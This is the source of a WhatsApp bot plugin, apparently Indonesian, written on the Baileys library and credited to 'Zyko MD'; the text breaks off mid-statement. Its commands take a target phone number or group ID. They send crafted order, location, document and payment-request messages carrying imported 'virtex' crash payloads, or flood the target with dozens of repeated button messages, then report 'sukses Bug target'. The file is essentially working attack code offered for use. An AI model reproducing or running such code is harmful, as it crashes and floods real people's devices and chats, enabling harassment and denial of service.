/*
Di Buat : Zyko MD
©Zyko MD 2023

 * ig: @zykomd
 * yt: @zykobotz
 * tt: @zykosiapa

Jangan di hapus creatornya kack
Saya capek ngetik kode 

"Wahai orang-orang yang beriman, mengapakah kamu mengatakan sesuatu yang tidak kamu kerjakan?
Amat besar kebencian di sisi Allah bahwa kamu mengatakan apa-apa yang tidak kamu kerjakan."
(QS ash-Shaff: 2-3).
*/


import axios from 'axios';
import cheerio from 'cheerio';
import buttonkal from '../virtex/buttonkal.js'
import buttonvirus from '../virtex/buttonvirus.js'
import bugsw from '../virtex/bugsw.js'
import iphone from '../virtex/iphone.js'
import iphone1 from '../virtex/iphone1.js'
import iphone2 from '../virtex/iphone2.js'
import iphone3 from '../virtex/iphone3.js'
import iphone4 from '../virtex/iphone4.js'
import iphone5 from '../virtex/iphone5.js'
import iphone6 from '../virtex/iphone6.js'
import fs from 'fs'
import { sizeFormatter } from 'human-readable';
import PhoneNumber from 'awesome-phonenumber'
import moment from 'moment-timezone'

const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = (await import('@adiwajshing/baileys')).default

const format = sizeFormatter();

let handler = async (m, { conn, args, text, usedPrefix, command, isROwner }) => {
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender
let ppnyauser = global.db.data.users[who].ppuser ? global.db.data.users[who].ppuser : await conn.profilePictureUrl(who, 'image').catch(_ => 'https://mycipongkor.com/wp-content/uploads/2022/05/Foto-profil-WA-kosong-senyum-min.jpg')
let name = conn.getName(who)
let virgam = fs.readFileSync(`./media/ok.jpg`)
let bugmd = 'https://i.ibb.co/zbhmXsn/bg.jpg'
let oto = './media/elaina2.png'
switch(command) {
case 'jaditroli': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD `)

{
let a = await conn.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© zyko md`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${text}`,
"orderTitle": `${text}`,
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted:m })
conn.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
//=================================================//
case 'jadilokas': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/ok.jpg') }, { upload: conn.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `${text} ${iphone6}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m })
conn.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
case 'jadidocu': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)

{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ${text} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
conn.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jagoan' : {
//if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Penggunaan ${usedPrefix+command} jumlah\nContoh ${usedPrefix+command} 5`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `Miku21Bot`,"body": `Selamat ${ucapan()} kak ${name}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://www.youtube.com/@zykobotz`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
break
//=================================================//
case 'jagoan2' : {
//if (!text) return m.reply(`masukan no target`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `Miku21Bot`,"body": `Selamat ${ucapan()} kak ${name}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://www.youtube.com/@zykobotz`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
m.reply('sukses Bug target')
}
//=================================================//
case '🦖': case '🦕': case '👿': case '😈': case '⚡': case '💥': case '🌪️': case '🍂': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
m.reply('sukses Bug target')
}
break
case '🌹' : {
if (!text) return m.reply(`masukan id group`)
let Pe = text.split("|")[0]+'@g.us'
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 await sleep(20)
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
